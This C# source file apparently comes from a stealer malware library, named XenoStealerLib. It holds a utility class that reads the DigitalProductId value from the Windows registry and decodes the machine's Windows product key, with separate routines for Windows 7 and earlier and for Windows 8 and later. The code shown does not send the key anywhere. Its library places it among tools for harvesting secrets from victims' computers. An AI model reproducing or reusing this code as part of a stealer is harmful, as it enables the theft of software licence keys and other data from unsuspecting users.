using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    public static class WindowsProductKeyUtils //thx https://github.com/guilhermelim/Get-Windows-Product-Key/tree/master
    {
        public static byte[] GetEncryptedProductId() 
        {
            using (RegistryKey localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
            {
                using (RegistryKey WindowsInfo=localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")) 
                {
                    object ProductId = WindowsInfo.GetValue("DigitalProductId");
                    if (ProductId == null || ProductId.GetType() != typeof(byte[])) 
                    {
                        return null;
                    }
                    return (byte[])ProductId;
                }
            }
        }

        public static string DecodeProductKey(byte[] digitalProductId) 
        {
            bool isWin8OrUp = Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2 || Environment.OSVersion.Version.Major > 6;
            if (isWin8OrUp) 
            {
                return DecodeProductKeyWin8AndUp(digitalProductId);
            }
            return DecodeProductKeyWin7AndBelow(digitalProductId);
        }

        private static string DecodeProductKeyWin7AndBelow(byte[] digitalProductId)
        {
            int keyStartIndex = 52;
            int keyEndIndex = keyStartIndex + 15;
            string digits = "BCDFGHJKMPQRTVWXY2346789";
            int decodeLength = 29;
            int decodeStringLength = 15;
            string decodedKey = string.Empty;
            byte[] hexPid = digitalProductId.Skip(keyStartIndex).Take(keyEndIndex).ToArray();
            
            for (var i = decodeLength - 1; i >= 0; i--)
            {
                if ((i + 1) % 6 == 0)
                {
                    decodedKey = "-" + decodedKey;
                }
                else
                {
                    int digitMapIndex = 0;
                    for (int j = decodeStringLength - 1; j >= 0; j--)
                    {
                        var byteValue = (digitMapIndex << 8) | (byte)hexPid[j];
                        hexPid[j] = (byte)(byteValue / 24);
                        digitMapIndex = byteValue % 24;
                    }
                    decodedKey = digits[digitMapIndex] + decodedKey;
                }
            }
            return decodedKey;
        }

        private static string DecodeProductKeyWin8AndUp(byte[] ProductKey)
        {
            int keyOffset = 52;
            int isWin8 = (ProductKey[66] / 6) & 1;
            ProductKey[66] = (byte)((ProductKey[66] & 0xf7) | ((isWin8 & 2) * 4));

            string digits = "BCDFGHJKMPQRTVWXY2346789";
            int last = 0;
            string decodedKey = "";
            for (int i = 24; i >= 0; i--)
            {
                int current = 0;
                for (int j = 14; j >= 0; j--)
                {
                    current *= 256;
                    current = ProductKey[j + keyOffset] + current;
                    ProductKey[j + keyOffset] = (byte)(current / 24);
                    current %= 24;
                    last = current;
                }
                decodedKey = digits[current] + decodedKey;
            }

            string keypart1 = decodedKey.Substring(1, last);
            string keypart2 = decodedKey.Substring(last + 1, decodedKey.Length - (last + 1));
            decodedKey = keypart1 + "N" + keypart2;
            for (int i = 5; i < decodedKey.Length; i += 6) 
            {
                decodedKey = decodedKey.Insert(i, "-");
            };
            return decodedKey;
        }

    }
}
